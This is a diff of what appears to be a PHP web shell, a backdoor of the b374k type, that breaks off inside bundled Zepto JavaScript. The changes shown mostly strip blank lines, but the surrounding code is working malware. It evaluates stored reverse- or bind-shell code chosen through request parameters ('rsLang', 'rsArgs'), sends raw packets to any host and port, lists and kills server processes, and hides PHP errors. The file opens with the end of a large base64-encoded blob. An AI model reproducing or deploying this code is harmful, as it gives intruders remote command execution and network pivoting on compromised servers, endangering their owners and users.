QlX1EHLwaVmetlacrDvUkqyB8Trbk/U/GZeIu3qVseyKcIN/K//lV9XLR58ezHMIkUjMLq1wxES9VCU9I1a9ivB/eOJMPB9CqZDWODTaJwqSwqjjyyDdWw2ujU7fND/+iq/qlby6fnxEumy//OkMb1dGgomZhxRib9B07XlTLBsVuKr4wiwHnZdFqb8z+Yb8f4VCq1ZK2R6c9qAs9/eAfRmYn00uZBIXESp6YMtAnXQhg0uen5zzvTe7PIcjEsrSsvNUElSRD3unww3WhNDs9CypOP1sp7Rr/W1NiHDeOk7mQa1cfVG5zpy246x2pU531eShXlba8dkLYsCNVIhd5qwJmJTukgw4dGVsV2Z2b6lPztu86tVUuxePD25Uq6SZi/srizBWcgzGhPAwR7Z/5GkFLc2z7TOdM9if/6ADM0mFNQ9IQPpl+2JO8ec78bsd7GDAgT36LepLCyVqCAyCC8s4KkM6lZ3Xi13kctDIuZ+JalYDn9jaPD2UllObdJQzj4yLyVC+4QOAk8BANRN5eIRWen8JWOAwNyVyYJg+l2yTdEN3a6crkeIi3FnRAPUXKspM4Vcwc15YJHi5VrTULwkp3OmpyJMFZo5iKwRP4ecGx8X40QcYB5gm2KyxVHaI8DYCMi7Yyxi7NBQoYbzpVNoC87VkFDfaVHMDQYOEjSKL2BmKhG1/LHnxYCSEc06Um6OdpR6YZXcrhCzNt/O8QhgnTpRpVW78NVf1erdoBnNLmSh8RzdaOITCsu/p7fusfAjXE/dPkH4ppr2ALXgLPEER7G2OwW6Z9OZ1N24MNQhe1Vj0xmIY+MYx6rLYR1BG010DtIJjzC+bWIA+FU3QTtTvRle4hhLsPBGByJjRrAPVTPWEPH0y/MkC8YqIXNy2e1FgGMGMzuVYlHT92GhoAIwDoCdYmOEDPBw2FnoAJ3euzGO01InJYhPqH0HJEE9yte5EY8fRMAnJ45sUESifocFozaHmMHM5FAf0ZKTqi1cYQpH7mVUFM/DYwLhG5b9h9Ar16GihfI3DLT4qJj5kBkwzHZ4iG+rVoUqKX6auNa2O2YeKQ20JDCFuzDVjZpP5VO6QZ9ItFEMucDQ2ghgNMf1Nkgm224TYiMJv+469Iu2UkpZGCljZxAC2qdoI39ncSYeIA/y//C6S0HQBE7X/EvkBjzZ+wSjQu+RNWj8bG9v++bjOK30O1H9XnqGJvAwD99pu5eW8t+631fGsjQ2PXh/J8vD1CeDxApspOU8LoMU4KJMZ581H0jRsdHPmWAfAUQhFPkqoUKvO4ABAuhmeeT1yRSClWqQBgg+T10QzFYPRo91vMlUoVab9FYUqxGP3m0FzJ6+TXiQBfokhF//zoHVuRlimG0dozN+f/O7/5vwA=";
-
 $GLOBALS['module']['network']['id'] = "network";
 $GLOBALS['module']['network']['title'] = "Network";
 $GLOBALS['module']['network']['js_ontabselected'] = "";
@@ -2132,13 +1962,10 @@ $GLOBALS['module']['network']['content'] = "
 </tfoot>
 </table>
 ";
-
-
 if(isset($p['rsLang']) && isset($p['rsArgs'])){
 	$rsLang = $p['rsLang'];
 	$rsArgs = $p['rsArgs'];
 	$res = "";
-
 	if($rsLang=="php"){
 		$code = get_resource("rs_".$rsLang);
 		if($code!==false){
@@ -2152,29 +1979,22 @@ if(isset($p['rsLang']) && isset($p['rsArgs'])){
 			$res = eval_go($rsLang, $code, "", $rsArgs);
 		}
 	}
-
 	if($res===false) $res == "error";
 	output(html_safe($res));
 }
 elseif(isset($p['packetTimeout'])&&isset($p['packetSTimeout'])&&isset($p['packetPort'])&&isset($p['packetTimeout'])&&isset($p['packetContent'])){
 	$packetHost = trim($p['packetHost']);
 	if(!preg_match("/[a-z0-9]+:\/\/.*/", $packetHost)) $packetHost = "tcp://".$packetHost;
-
 	$packetPort = (int) $p['packetPort'];
-
 	$packetTimeout = (int) $p['packetTimeout'];
 	$packetSTimeout = (int) $p['packetSTimeout'];
-
 	$packetContent = $p['packetContent'];
 	if(ctype_xdigit($packetContent)) $packetContent = @pack("H*" , $packetContent);
 	else{
 		$packetContent = str_replace(array("\r","\n"), "", $packetContent);
 		$packetContent = str_replace(array("\\r","\\n"), array("\r", "\n"), $packetContent);
 	}
-
 	$res = "";
-
-
 	$sock = fsockopen($packetHost, $packetPort, $errNo, $errStr, $packetTimeout);
 	if(!$sock){
 		$res .= "<div class='weak'>";
@@ -2195,15 +2015,12 @@ elseif(isset($p['packetTimeout'])&&isset($p['packetSTimeout'])&&isset($p['packet
 		$res .= "<table class='boxtbl'><tr><td><textarea style='height:140px;min-height:140px;'>".html_safe($bin)."</textarea></td></tr>";
 		$res .= "<tr><td><textarea style='height:140px;min-height:140px;'>".bin2hex($bin)."</textarea></td></tr></table>";
 	}
-
 	output($res);
 }
-
 $GLOBALS['module']['processes']['id'] = "processes";
 $GLOBALS['module']['processes']['title'] = "Processes";
 $GLOBALS['module']['processes']['js_ontabselected'] = "show_processes();";
 $GLOBALS['module']['processes']['content'] = "";
-
 if(!function_exists('show_processes')){
 	function show_processes(){
 		$output = '';
@@ -2216,20 +2033,16 @@ if(!function_exists('show_processes')){
 			$cmd = "ps aux";
 			$wexplode = " ";
 		}
-
 		$res = execute($cmd);
 		if(trim($res)=='') return false;
 		else{
 			$output .= "<table id='psTable' class='dataView sortable'>";
 			if(!is_win()) $res = preg_replace('#\ +#',' ',$res);
-
 			$psarr = explode("\n",$res);
 			$fi = true;
 			$tblcount = 0;
-
 			$check = explode($wexplode,$psarr[0]);
 			$wcount = count($check);
-
 			foreach($psarr as $psa){
 				if(trim($psa)!=''){
 					if($fi){
@@ -2244,7 +2057,6 @@ if(!function_exists('show_processes')){
 						$pid = trim(trim($psln[1]),"\"");
 						$tblcount = 0;
 						$output .= "<tr data-pid='".$pid."'>";
-
 						foreach($psln as $p){
 							if(trim($p)=="") $p = " ";
 							$p = trim(trim($p) ,"\"");
@@ -2270,8 +2082,6 @@ if(!function_exists('show_processes')){
 		return $output;
 	}
 }
-
-
 if(isset($p['showProcesses'])){
 	$processes = show_processes();
 	if($processes!==false) output($processes);
@@ -2306,14 +2116,11 @@ elseif(isset($p['allPid'])){
 	if($counter>0) output($counter);
 	else output('error');
 }
-
 $error = @ob_get_contents();
 	$error_html = (!empty($error))?"<pre class='phpError border'>".str_replace("\n\n", "\n", html_safe($error))."</pre>":"";
 	@ob_end_clean();
 	error_reporting(0);
 	@ini_set('display_errors','0');
-
-
 ?><!doctype html>
 <html>
 <head>
@@ -2794,8 +2601,6 @@ var win = <?php echo (is_win())?'true':'false';?>;
 var init_shell = true;
 /* Zepto v1.1.2 - zepto event ajax form ie - zeptojs.com/license */
 var Zepto=function(){function G(a){return a==null?String(a):z[A.call(a)]||"object"}function H(a){return G(a)=="function"}function I(a){return a!=null&&a==a.window}function J(a){return a!=null&&a.nodeType==a.DOCUMENT_NODE}function K(a){return G(a)=="object"}function L(a){return K(a)&&!I(a)&&Object.getPrototypeOf(a)==Object.prototype}function M(a){return a instanceof Array}function N(a){return typeof a.length=="number"}function O(a){return g.call(a,function(a){return a!=null})}function P(a){return a.length>0?c.fn.concat.apply([],a):a}function Q(a){return a.replace(/::/g,"/").replace(/([A-Z]+)([A-Z][a-z])/g,"$1_$2").replace(/([a-z\d])([A-Z])/g,"$1_$2").replace(/_/g,"-").toLowerCase()}function R(a){return a in j?j[a]:j[a]=new RegExp("(^|\\s)"+a+"(\\s|$)")}function S(a,b){return typeof b=="number"&&!k[Q(a)]?b+"px":b}function T(a){var b,c;return i[a]||(b=h.createElement(a),h.body.appendChild(b),c=getComputedStyle(b,"").getPropertyValue("display"),b.parentNode.removeChild(b),c=="none"&&(c="block"),i[a]=c),i[a]}function U(a){return"children"in a?f.call(a.children):c.map(a.childNodes,function(a){if(a.nodeType==1)return a})}function V(c,d,e){for(b in d)e&&(L(d[b])||M(d[b]))?(L(d[b])&&!L(c[b])&&(c[b]={}),M(d[b])&&!M(c[b])&&(c[b]=[]),V(c[b],d[b],e)):d[b]!==a&&(c[b]=d[b])}function W(a,b){return b==null?c(a):c(a).filter(b)}function X(a,b,c,d){return H(b)?b.call(a,c,d):b}function Y(a,b,c){c==null?a.removeAttribute(b):a.setAttribute(b,c)}function Z(b,c){var d=b.className,e=d&&d.baseVal!==a;if(c===a)return e?d.baseVal:d;e?d.baseVal=c:b.className=c}function $(a){var b;try{return a?a=="true"||(a=="false"?!1:a=="null"?null:!/^0/.test(a)&&!isNaN(b=Number(a))?b:/^[\[\{]/.test(a)?c.parseJSON(a):a):a}catch(d){return a}}function _(a,b){b(a);for(var c in a.childNodes)_(a.childNodes[c],b)}var a,b,c,d,e=[],f=e.slice,g=e.filter,h=window.document,i={},j={},k={"column-count":1,columns:1,"font-weight":1,"line-height":1,opacity:1,"z-index":1,zoom:1},l=/^\s*<(\w+|!)[^>]*>/,m=/^<(\w+)\s*\/?>(?:<\/\1>|)$/,n=/<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^>]*)\/>/ig,o=/^(?:body|html)$/i,p=/([A-Z])/g,q=["val","css","html","text","data","width","height","offset"],r=["after","prepend","before","append"],s=h.createElement("table"),t=h.createElement("tr"),u={tr:h.createElement("tbody"),tbody:s,thead:s,tfoot:s,td:t,th:t,"*":h.createElement("div")},v=/complete|loaded|interactive/,w=/^\.([\w-]+)$/,x=/^#([\w-]*)$/,y=/^[\w-]*$/,z={},A=z.toString,B={},C,D,E=h.createElement("div"),F={tabindex:"tabIndex",readonly:"readOnly","for":"htmlFor","class":"className",maxlength:"maxLength",cellspacing:"cellSpacing",cellpadding:"cellPadding",rowspan:"rowSpan",colspan:"colSpan",usemap:"useMap",frameborder:"frameBorder",contenteditable:"contentEditable"};return B.matches=function(a,b){if(!b||!a||a.nodeType!==1)return!1;var c=a.webkitMatchesSelector||a.mozMatchesSelector||a.oMatchesSelector||a.matchesSelector;if(c)return c.call(a,b);var d,e=a.parentNode,f=!e;return f&&(e=E).appendChild(a),d=~B.qsa(e,b).indexOf(a),f&&E.removeChild(a),d},C=function(a){return a.replace(/-+(.)?/g,function(a,b){return b?b.toUpperCase():""})},D=function(a){return g.call(a,function(b,c){return a.indexOf(b)==c})},B.fragment=function(b,d,e){var g,i,j;return m.test(b)&&(g=c(h.createElement(RegExp.$1))),g||(b.replace&&(b=b.replace(n,"<$1></$2>")),d===a&&(d=l.test(b)&&RegExp.$1),d in u||(d="*"),j=u[d],j.innerHTML=""+b,g=c.each(f.call(j.childNodes),function(){j.removeChild(this)})),L(e)&&(i=c(g),c.each(e,function(a,b){q.indexOf(a)>-1?i[a](b):i.attr(a,b)})),g},B.Z=function(a,b){return a=a||[],a.__proto__=c.fn,a.selector=b||"",a},B.isZ=function(a){return a instanceof B.Z},B.init=function(b,d){var e;if(!b)return B.Z();if(typeof b=="string"){b=b.trim();if(b[0]=="<"&&l.test(b))e=B.fragment(b,RegExp.$1,d),b=null;else{if(d!==a)return c(d).find(b);e=B.qsa(h,b)}}else{if(H(b))return c(h).ready(b);if(B.isZ(b))return b;if(M(b))e=O(b);else if(K(b))e=[b],b=null;else if(l.test(b))e=B.fragment(b.trim(),RegExp.$1,d),b=null;else{if(d!==a)return c(d).find(b);e=B.qsa(h,b)}}return B.Z(e,b)},c=function(a,b){return B.init(a,b)},c.extend=function(a){var b,c=f.call(arguments,1);return typeof a=="boolean"&&(b=a,a=c.shift()),c.forEach(function(c){V(a,c,b)}),a},B.qsa=function(a,b){var c,d=b[0]=="#",e=!d&&b[0]==".",g=d||e?b.slice(1):b,h=y.test(g);return J(a)&&h&&d?(c=a.getElementById(g))?[c]:[]:a.nodeType!==1&&a.nodeType!==9?[]:f.call(h&&!d?e?a.getElementsByClassName(g):a.getElementsByTagName(b):a.querySelectorAll(b))},c.contains=function(a,b){return a!==b&&a.contains(b)},c.type=G,c.isFunction=H,c.isWindow=I,c.isArray=M,c.isPlainObject=L,c.isEmptyObject=function(a){var b;for(b in a)return!1;return!0},c.inArray=function(a,b,c){return e.indexOf.call(b,a,c)},c.camelCase=C,c.trim=function(a){return a==null?"":String.prototype.trim.call(a)},c.uuid=0,c.support={},c.expr={},c.map=function(a,b){var c,d=[],e,f;if(N(a))for(e=0;e<a.length;e++)c=b(a[e],e),c!=null&&d.push(c);else for(f in a)c=b(a[f],f),c!=null&&d.push(c);return P(d)},c.each=function(a,b){var c,d;if(N(a)){for(c=0;c<a.length;c++)if(b.call(a[c],c,a[c])===!1)return a}else for(d in a)if(b.call(a[d],d,a[d])===!1)return a;return a},c.grep=function(a,b){return g.call(a,b)},window.JSON&&(c.parseJSON=JSON.parse),c.each("Boolean Number String Function Array Date RegExp Object Error".split(" "),function(a,b){z["[object "+b+"]"]=b.toLowerCase()}),c.fn={forEach:e.forEach,reduce:e.reduce,push:e.push,sort:e.sort,indexOf:e.indexOf,concat:e.concat,map:function(a){return c(c.map(this,function(b,c){return a.call(b,c,b)}))},slice:function(){return c(f.apply(this,arguments))},ready:function(a){return v.test(h.readyState)&&h.body?a(c):h.addEventListener("DOMContentLoaded",function(){a(c)},!1),this},get:function(b){return b===a?f.call(this):this[b>=0?b:b+this.length]},toArray:function(){return this.get()},size:function(){return this.length},remove:function(){return this.each(function(){this.parentNode!=null&&this.parentNode.removeChild(this)})},each:function(a){return e.every.call(this,function(b,c){return a.call(b,c,b)!==!1}),this},filter:function(a){return H(a)?this.not(this.not(a)):c(g.call(this,function(b){return B.matches(b,a)}))},add:function(a,b){return c(D(this.concat(c(a,b))))},is:function(a){return this.length>0&&B.matches(this[0],a)},not:function(b){var d=[];if(H(b)&&b.call!==a)this.each(function(a){b.call(this,a)||d.push(this)});else{var e=typeof b=="string"?this.filter(b):N(b)&&H(b.item)?f.call(b):c(b);this.forEach(function(a){e.indexOf(a)<0&&d.push(a)})}return c(d)},has:function(a){return this.filter(function(){return K(a)?c.contains(this,a):c(this).find(a).size()})},eq:function(a){return a===-1?this.slice(a):this.slice(a,+a+1)},first:function(){var a=this[0];return a&&!K(a)?a:c(a)},last:function(){var a=this[this.length-1];return a&&!K(a)?a:c(a)},find:function(a){var b,d=this;return typeof a=="object"?b=c(a).filter(function(){var a=this;return e.some.call(d,function(b){return c.contains(b,a)})}):this.length==1?b=c(B.qsa(this[0],a)):b=this.map(function(){return B.qsa(this,a)}),b},closest:function(a,b){var d=this[0],e=!1;typeof a=="object"&&(e=c(a));while(d&&!(e?e.indexOf(d)>=0:B.matches(d,a)))d=d!==b&&!J(d)&&d.parentNode;return c(d)},parents:function(a){var b=[],d=this;while(d.length>0)d=c.map(d,function(a){if((a=a.parentNode)&&!J(a)&&b.indexOf(a)<0)return b.push(a),a});return W(b,a)},parent:function(a){return W(D(this.pluck("parentNode")),a)},children:function(a){return W(this.map(function(){return U(this)}),a)},contents:function(){return this.map(function(){return f.call(this.childNodes)})},siblings:function(a){return W(this.map(function(a,b){return g.call(U(b.parentNode),function(a){return a!==b})}),a)},empty:function(){return this.each(function(){this.innerHTML=""})},pluck:function(a){return c.map(this,function(b){return b[a]})},show:function(){return this.each(function(){this.style.display=="none"&&(this.style.display=""),getComputedStyle(this,"").getPropertyValue("display")=="none"&&(this.style.display=T(this.nodeName))})},replaceWith:function(a){return this.before(a).remove()},wrap:function(a){var b=H(a);if(this[0]&&!b)var d=c(a).get(0),e=d.parentNode||this.length>1;return this.each(function(f){c(this).wrapAll(b?a.call(this,f):e?d.cloneNode(!0):d)})},wrapAll:function(a){if(this[0]){c(this[0]).before(a=c(a));var b;while((b=a.children()).length)a=b.first();c(a).append(this)}return this},wrapInner:function(a){var b=H(a);return this.each(function(d){var e=c(this),f=e.contents(),g=b?a.call(this,d):a;f.length?f.wrapAll(g):e.append(g)})},unwrap:function(){return this.parent().each(function(){c(this).replaceWith(c(this).children())}),this},clone:function(){return this.map(function(){return this.cloneNode(!0)})},hide:function(){return this.css("display","none")},toggle:function(b){return this.each(function(){var d=c(this);(b===a?d.css("display")=="none":b)?d.show():d.hide()})},prev:function(a){return c(this.pluck("previousElementSibling")).filter(a||"*")},next:function(a){return c(this.pluck("nextElementSibling")).filter(a||"*")},html:function(a){return arguments.length===0?this.length>0?this[0].innerHTML:null:this.each(function(b){var d=this.innerHTML;c(this).empty().append(X(this,a,b,d))})},text:function(b){return arguments.length===0?this.length>0?this[0].textContent:null:this.each(function(){this.textContent=b===a?"":""+b})},attr:function(c,d){var e;return typeof c=="string"&&d===a?this.length==0||this[0].nodeType!==1?a:c=="value"&&this[0].nodeName=="INPUT"?this.val():!(e=this[0].getAttribute(c))&&c in this[0]?this[0][c]:e:this.each(function(a){if(this.nodeType!==1)return;if(K(c))for(b in c)Y(this,b,c[b]);else Y(this,c,X(this,d,a,this.getAttribute(c)))})},removeAttr:function(a){return this.each(function(){this.nodeType===1&&Y(this,a)})},prop:function(b,c){return b=F[b]||b,c===a?this[0]&&this[0][b]:this.each(function(a){this[b]=X(this,c,a,this[b])})},data:function(b,c){var d=this.attr("data-"+b.replace(p,"-$1").toLowerCase(),c);return d!==null?$(d):a},val:function(a){return arguments.length===0?this[0]&&(this[0].multiple?c(this[0]).find("option").filter(function(){return this.selected}).pluck("value"):this[0].value):this.each(function(b){this.value=X(this,a,b,this.value)})},offset:function(a){if(a)return this.each(function(b){var d=c(this),e=X(this,a,b,d.offset()),f=d.offsetParent().offset(),g={top:e.top-f.top,left:e.left-f.left};d.css("position")=="static"&&(g.position="relative"),d.css(g)});if(this.length==0)return null;var b=this[0].getBoundingClientRect();return{left:b.left+window.pageXOffset,top:b.top+window.pageYOffset,width:Math.round(b.width),height:Math.round(b.height)}},css:function(a,d){if(arguments.length<2){var e=this[0],f=getComputedStyle(e,"");if(!e)return;if(typeof a=="string")return e.style[C(a)]||f.getPropertyValue(a);if(M(a)){var g={};return c.each(M(a)?a:[a],function(a,b){g[b]=e.style[C(b)]||f.getPropertyValue(b)}),g}}var h="";if(G(a)=="string")!d&&d!==0?this.each(function(){this.style.removeProperty(Q(a))}):h=Q(a)+":"+S(a,d);else for(b in a)!a[b]&&a[b]!==0?this.each(function(){this.style.removeProperty(Q(b))}):h+=Q(b)+":"+S(b,a[b])+";";return this.each(function(){this.style.cssText+=";"+h})},index:function(a){return a?this.indexOf(c(a)[0]):this.parent().children().indexOf(this[0])},hasClass:function(a){return a?e.some.call(this,function(a){return this.test(Z(a))},R(a)):!1},addClass:function(a){return a?this.each(function(b){d=[];var e=Z(this),f=X(this,a,b,e);f.split(/\s+/g).forEach(function(a){c(this).hasClass(a)||d.push(a)},this),d.length&&Z(this,e+(e?" ":"")+d.join(" "))}):this},removeClass:function(b){return this.each(function(c){if(b===a)return Z(this,"");d=Z(this),X(this,b,c,d).split(/\s+/g).forEach(function(a){d=d.replace(R(a)," ")}),Z(this,d.trim())})},toggleClass:function(b,d){return b?this.each(function(e){var f=c(this),g=X(this,b,e,Z(this));g.split(/\s+/g).forEach(function(b){(d===a?!f.hasClass(b):d)?f.addClass(b):f.removeClass(b)})}):this},scrollTop:function(b){if(!this.length)return;var c="scrollTop"in this[0];return b===a?c?this[0].scrollTop:this[0].pageYOffset:this.each(c?function(){this.scrollTop=b}:function(){this.scrollTo(this.scrollX,b)})},scrollLeft:function(b){if(!this.length)return;var c="scrollLeft"in this[0];return b===a?c?this[0].scrollLeft:this[0].pageXOffset:this.each(c?function(){this.scrollLeft=b}:function(){this.scrollTo(b,this.scrollY)})},position:function(){if(!this.length)return;var a=this[0],b=this.offsetParent(),d=this.offset(),e=o.test(b[0].nodeName)?{top:0,left:0}:b.offset();return d.top-=parseFloat(c(a).css("margin-top"))||0,d.left-=parseFloat(c(a).css("margin-left"))||0,e.top+=parseFloat(c(b[0]).css("border-top-width"))||0,e.left+=parseFloat(c(b[0]).css("border-left-width"))||0,{top:d.top-e.top,left:d.left-e.left}},offsetParent:function(){return this.map(function(){var a=this.offsetParent||h.body;while(a&&!o.test(a.nodeName)&&c(a).css("position")=="static")a=a.offsetParent;return a})}},c.fn.detach=c.fn.remove,["width","height"].forEach(function(b){var d=b.replace(/./,function(a){return a[0].toUpperCase()});c.fn[b]=function(e){var f,g=this[0];return e===a?I(g)?g["inner"+d]:J(g)?g.documentElement["scroll"+d]:(f=this.offset())&&f[b]:this.each(function(a){g=c(this),g.css(b,X(this,e,a,g[b]()))})}}),r.forEach(function(a,b){var d=b%2;c.fn[a]=function(){var a,e=c.map(arguments,function(b){return a=G(b),a=="object"||a=="array"||b==null?b:B.fragment(b)}),f,g=this.length>1;return e.length<1?this:this.each(function(a,h){f=d?h:h.parentNode,h=b==0?h.nextSibling:b==1?h.firstChild:b==2?h:null,e.forEach(function(a){if(g)a=a.cloneNode(!0);else if(!f)return c(a).remove();_(f.insertBefore(a,h),function(a){a.nodeName!=null&&a.nodeName.toUpperCase()==="SCRIPT"&&(!a.type||a.type==="text/javascript")&&!a.src&&window.eval.call(window,a.innerHTML)})})})},c.fn[d?a+"To":"insert"+(b?"Before":"After")]=function(b){return c(b)[a](this),this}}),B.Z.prototype=c.fn,B.uniq=D,B.deserializeValue=$,c.zepto=B,c}();window.Zepto=Zepto,window.$===undefined&&(window.$=Zepto),function(a){function m(a){return a._zid||(a._zid=c++)}function n(a,b,c,d){b=o(b);if(b.ns)var e=p(b.ns);return(h[m(a)]||[]).filter(function(a){return a&&(!b.e||a.e==b.e)&&(!b.ns||e.test(a.ns))&&(!c||m(a.fn)===m(c))&&(!d||a.sel==d)})}function o(a){var b=(""+a).split(".");return{e:b[0],ns:b.slice(1).sort().join(" ")}}function p(a){return new RegExp("(?:^| )"+a.replace(" "," .* ?")+"(?: |$)")}function q(a,b){return a.del&&!j&&a.e in k||!!b}function r(a){return l[a]||j&&k[a]||a}function s(b,c,e,f,g,i,j){var k=m(b),n=h[k]||(h[k]=[]);c.split(/\s/).forEach(function(c){if(c=="ready")return a(document).ready(e);var h=o(c);h.fn=e,h.sel=g,h.e in l&&(e=function(b){var c=b.relatedTarget;if(!c||c!==this&&!a.contains(this,c))return h.fn.apply(this,arguments)}),h.del=i;var k=i||e;h.proxy=function(a){a=y(a);if(a.isImmediatePropagationStopped())return;a.data=f;var c=k.apply(b,a._args==d?[a]:[a].concat(a._args));return c===!1&&(a.preventDefault(),a.stopPropagation()),c},h.i=n.length,n.push(h),"addEventListener"in b&&b.addEventListener(r(h.e),h.proxy,q(h,j))})}function t(a,b,c,d,e){var f=m(a);(b||"").split(/\s/).forEach(function(b){n(a,b,c,d).forEach(function(b){delete h[f][b.i],"removeEventListener"in a&&a.removeEventListener(r(b.e),b.proxy,q(b,e))})})}function y(b,c){if(c||!b.isDefaultPrevented){c||(c=b),a.each(x,function(a,d){var e=c[a];b[a]=function(){return this[d]=u,e&&e.apply(c,arguments)},b[d]=v});if(c.defaultPrevented!==d?c.defaultPrevented:"returnValue"in c?c.returnValue===!1:c.getPreventDefault&&c.getPreventDefault())b.isDefaultPrevented=u}return b}function z(a){var b,c={originalEvent:a};for(b in a)!w.test(b)&&a[b]!==d&&(c[b]=a[b]);return y(c,a)}var b=a.zepto.qsa,c=1,d,e=Array.prototype.slice,f=a.isFunction,g=function(a){return typeof a=="string"},h={},i={},j="onfocusin"in window,k={focus:"focusin",blur:"focusout"},l={mouseenter:"mouseover",mouseleave:"mouseout"};i.click=i.mousedown=i.mouseup=i.mousemove="MouseEvents",a.event={add:s,remove:t},a.proxy=function(b,c){if(f(b)){var d=function(){return b.apply(c,arguments)};return d._zid=m(b),d}if(g(c))return a.proxy(b[c],b);throw new TypeError("expected function")},a.fn.bind=function(a,b,c){return this.on(a,b,c)},a.fn.unbind=function(a,b){return this.off(a,b)},a.fn.one=function(a,b,c,d){return this.on(a,b,c,d,1)};var u=function(){return!0},v=function(){return!1},w=/^([A-Z]|returnValue$|layer[XY]$)/,x={preventDefault:"isDefaultPrevented",stopImmediatePropagation:"isImmediatePropagationStopped",stopPropagation:"isPropagationStopped"};a.fn.delegate=function(a,b,c){return this.on(b,a,c)},a.fn.undelegate=function(a,b,c){return this.off(b,a,c)},a.fn.live=function(b,c){return a(document.body).delegate(this.selector,b,c),this},a.fn.die=function(b,c){return a(document.body).undelegate(this.selector,b,c),this},a.fn.on=function(b,c,h,i,j){var k,l,m=this;if(b&&!g(b))return a.each(b,function(a,b){m.on(a,c,h,b,j)}),m;!g(c)&&!f(i)&&i!==!1&&(i=h,h=c,c=d);if(f(h)||h===!1)i=h,h=d;return i===!1&&(i=v),m.each(function(d,f){j&&(k=function(a){return t(f,a.type,i),i.apply(this,arguments)}),c&&(l=function(b){var d,g=a(b.target).closest(c,f).get(0);if(g&&g!==f)return d=a.extend(z(b),{currentTarget:g,liveFired:f}),(k||i).apply(g,[d].concat(e.call(arguments,1)))}),s(f,b,i,h,c,l||k)})},a.fn.off=function(b,c,e){var h=this;return b&&!g(b)?(a.each(b,function(a,b){h.off(a,c,b)}),h):(!g(c)&&!f(e)&&e!==!1&&(e=c,c=d),e===!1&&(e=v),h.each(function(){t(this,b,e,c)}))},a.fn.trigger=function(b,c){return b=g(b)||a.isPlainObject(b)?a.Event(b):y(b),b._args=c,this.each(function(){"dispatchEvent"in this?this.dispatchEvent(b):a(this).triggerHandler(b,c)})},a.fn.triggerHandler=function(b,c){var d,e;return this.each(function(f,h){d=z(g(b)?a.Event(b):b),d._args=c,d.target=h,a.each(n(h,b.type||b),function(a,b){e=b.proxy(d);if(d.isImmediatePropagationStopped())return!1})}),e},"focusin focusout load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select keydown keypress keyup error".split(" ").forEach(function(b){a.fn[b]=function(a){return a?this.bind(b,a):this.trigger(b)}}),["focus","blur"].forEach(function(b){a.fn[b]=function(a){return a?this.bind(b,a):this.each(function(){try{this[b]()}catch(a){}}),this}}),a.Event=function(a,b){g(a)||(b=a,a=b.type);var c=document.createEvent(i[a]||"Events"),d=!0;if(b)for(var e in b)e=="bubbles"?d=!!b[e]:c[e]=b[e];return c.initEvent(a,d,!0),y(c)}}(Zepto),function($){function triggerAndReturn(a,b,c){var d=$.Event(b);return $(a).trigger(d,c),!d.isDefaultPrevented()}function triggerGlobal(a,b,c,d){if(a.global)return triggerAndReturn(b||document,c,d)}function ajaxStart(a){a.global&&$.active++===0&&triggerGlobal(a,null,"ajaxStart")}function ajaxStop(a){a.global&&!--$.active&&triggerGlobal(a,null,"ajaxStop")}function ajaxBeforeSend(a,b){var c=b.context;if(b.beforeSend.call(c,a,b)===!1||triggerGlobal(b,c,"ajaxBeforeSend",[a,b])===!1)return!1;triggerGlobal(b,c,"ajaxSend",[a,b])}function ajaxSuccess(a,b,c,d){var e=c.context,f="success";c.success.call(e,a,f,b),d&&d.resolveWith(e,[a,f,b]),triggerGlobal(c,e,"ajaxSuccess",[b,c,a]),ajaxComplete(f,b,c)}function ajaxError(a,b,c,d,e){var f=d.context;d.error.call(f,c,b,a),e&&e.rejectWith(f,[c,b,a]),triggerGlobal(d,f,"ajaxError",[c,d,a||b]),ajaxComplete(b,c,d)}function ajaxComplete(a,b,c){var d=c.context;c.complete.call(d,b,a),triggerGlobal(c,d,"ajaxComplete",[b,c]),ajaxStop(c)}function empty(){}function mimeToDataType(a){return a&&(a=a.split(";",2)[0]),a&&(a==htmlType?"html":a==jsonType?"json":scriptTypeRE.test(a)?"script":xmlTypeRE.test(a)&&"xml")||"text"}function appendQuery(a,b){return b==""?a:(a+"&"+b).replace(/[&?]{1,2}/,"?")}function serializeData(a){a.processData&&a.data&&$.type(a.data)!="string"&&(a.data=$.param(a.data,a.traditional)),a.data&&(!a.type||a.type.toUpperCase()=="GET")&&(a.url=appendQuery(a.url,a.data),a.data=undefined)}function parseArguments(a,b,c,d){var e=!$.isFunction(b);return{url:a,data:e?b:undefined,success:e?$.isFunction(c)?c:undefined:b,dataType:e?d||c:c}}function serialize(a,b,c,d){var e,f=$.isArray(b),g=$.isPlainObject(b);$.each(b,function(b,h){e=$.type(h),d&&(b=c?d:d+"["+(g||e=="object"||e=="array"?b:"")+"]"),!d&&f?a.add(h.name,h.value):e=="array"||!c&&e=="object"?serialize(a,h,c,b):a.add(b,h)})}var jsonpID=0,document=window.document,key,name,rscript=/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,scriptTypeRE=/^(?:text|application)\/javascript/i,xmlTypeRE=/^(?:text|application)\/xml/i,jsonType="application/json",htmlType="text/html",blankRE=/^\s*$/;$.active=0,$.ajaxJSONP=function(a,b){if("type"in a){var c=a.jsonpCallback,d=($.isFunction(c)?c():c)||"jsonp"+ ++jsonpID,e=document.createElement("script"),f=window[d],g,h=function(a){$(e).triggerHandler("error",a||"abort")},i={abort:h},j;return b&&b.promise(i),$(e).on("load error",function(c,h){clearTimeout(j),$(e).off().remove(),c.type=="error"||!g?ajaxError(null,h||"error",i,a,b):ajaxSuccess(g[0],i,a,b),window[d]=f,g&&$.isFunction(f)&&f(g[0]),f=g=undefined}),ajaxBeforeSend(i,a)===!1?(h("abort"),i):(window[d]=function(){g=arguments},e.src=a.url.replace(/=\?/,"="+d),document.head.appendChild(e),a.timeout>0&&(j=setTimeout(function(){h("timeout")},a.timeout)),i)}return $.ajax(a)},$.ajaxSettings={type:"GET",beforeSend:empty,success:empty,error:empty,complete:empty,context:null,global:!0,xhr:function(){return new window.XMLHttpRequest},accepts:{script:"text/javascript, application/javascript, application/x-javascript",json:jsonType,xml:"application/xml, text/xml",html:htmlType,text:"text/plain"},crossDomain:!1,timeout:0,processData:!0,cache:!0},$.ajax=function(options){var settings=$.extend({},options||{}),deferred=$.Deferred&&$.Deferred();for(key in 